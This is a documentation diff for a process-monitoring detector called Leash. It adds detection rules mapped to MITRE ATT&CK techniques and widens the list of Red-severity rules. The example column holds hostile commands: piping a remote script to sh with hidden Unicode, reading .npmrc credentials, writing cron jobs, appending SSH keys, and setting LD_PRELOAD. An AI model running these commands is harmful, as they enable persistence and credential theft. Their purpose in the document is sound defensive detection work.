@@ -26,11 +26,21 @@ The table below documents command-pattern detections emitted by `detect_dangerou
 | `kube_config_access` | T1552.001 | Detects reads of Kubernetes client config that may contain credentials. | Orange | MITRE ATT&CK T1552.001 (Credentials In Files): https://attack.mitre.org/techniques/T1552/001/ | `cat ~/.kube/config` |
 | `touch_mkdir_sensitive` | T1005 | Detects directory creation or touch activity in sensitive filesystem paths. | Orange | MITRE ATT&CK T1005 (Data from Local System): https://attack.mitre.org/techniques/T1005/ | `mkdir /etc/cron.hourly/.cache` |
 | `write_sensitive_path` | T1222.001 | Detects writes/copies/moves into sensitive paths under `/etc`, `/usr`, `/var`, `/boot`, or `/Library`. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `cp payload /etc/cron.d/system-update` |
+| `rmm_suspicious_parent` | T1219 | Detects ScreenConnect/AnyDesk/TeamViewer/ConnectWise processes launched by suspicious non-standard parents (especially IDE parents). | Red | Aikido Security research on RMM abuse in dev environments (Jan 2026): https://www.aikido.dev/ | `code -> screenconnect --session abc` |
+| `npm_pip_postinstall_shell` | T1195.002 | Detects shell interpreters spawned as children of `npm`/`pip` install processes. | Orange | Socket and Snyk supply-chain research on install-script abuse: https://socket.dev/ and https://snyk.io/ | `npm install evil-pkg` followed by `sh -c ./postinstall.sh` |
+| `hidden_unicode_command` | T1027.013 | Detects hidden Unicode in command lines, including PUA (`U+E000`-`U+F8FF`) and invisible format chars (`U+200B`, `U+200D`, `U+FEFF`). | Red | Veracode and TrueSec GlassWorm reporting on hidden Unicode obfuscation: https://www.veracode.com/ and https://www.truesec.com/ | `curl​ https://example.com/install.sh \| sh` |
+| `ai_agent_credential_access` | T1552 | Detects read-style commands targeting `.env`, `.npmrc`, `.netrc`, `.gitconfig` from AI-agent-like process trees. | Red | OWASP and Obsidian Security guidance on agent credential exposure: https://owasp.org/ and https://www.obsidiansecurity.com/ | `python -> cat ~/.npmrc` |
+| `ai_skill_directory_spawn` | T1059 | Detects process execution with working directories under AI skill/plugin/extension paths. | Orange | Snyk ToxicSkills research: https://snyk.io/ | `cwd=/home/user/.codex/skills/...` |
+| `pyinstaller_unexpected_location` | T1195.002 | Detects `_MEIPASS`/`_MEI*` execution context in dependency trees (`node_modules`, `site-packages`, `dist-packages`). | Red | Socket research on malicious package delivery with PyInstaller payloads: https://socket.dev/ | `/home/user/project/node_modules/pkg/_MEI12345/payload` |
+| `package_install_external_ip` | T1071.001 | Detects network-capable child processes under package install parents (`npm`/`pip`/`cargo`/`gem`) reaching external raw IPv4 destinations. | Orange | Sigma rule patterns for suspicious installer-network behavior: https://github.com/SigmaHQ/sigma | `npm install ...` then `curl http://8.8.8.8/payload.sh` |
+| `ld_preload_set` | T1574.006 | Detects processes with `LD_PRELOAD` explicitly set in environment. | Red | MITRE ATT&CK T1574.006 (Dynamic Linker Hijacking): https://attack.mitre.org/techniques/T1574/006/ | `LD_PRELOAD=/tmp/libx.so /usr/bin/ls` |
+| `crontab_modification` | T1053.003 | Detects `crontab -e` and write operations targeting `/var/spool/cron/` or `/etc/cron.d/`. | Orange | MITRE ATT&CK T1053.003 (Cron): https://attack.mitre.org/techniques/T1053/003/ | `echo \"* * * * * ...\" > /etc/cron.d/system-update` |
+| `ssh_authorized_keys_modification` | T1098.004 | Detects write operations to `~/.ssh/authorized_keys`. | Red | MITRE ATT&CK T1098.004 (SSH Authorized Keys): https://attack.mitre.org/techniques/T1098/004/ | `echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys` |
 
 ## Severity model
 
 Leash assigns detection event severity in `ProcessCollector::analyze`:
-- `Red`: any detection hit containing `write_sensitive_path`, `download_exec`, or `encoded_python`
+- `Red`: `write_sensitive_path`, `download_exec`, `download_exec_tmpdir`, `encoded_python`, `rmm_suspicious_parent`, `hidden_unicode_command`, `ai_agent_credential_access`, `pyinstaller_unexpected_location`, `ld_preload_set`, `ssh_authorized_keys_modification`
 - `Orange`: all other command-pattern detections
 
 Reference: `src/collector.rs`.
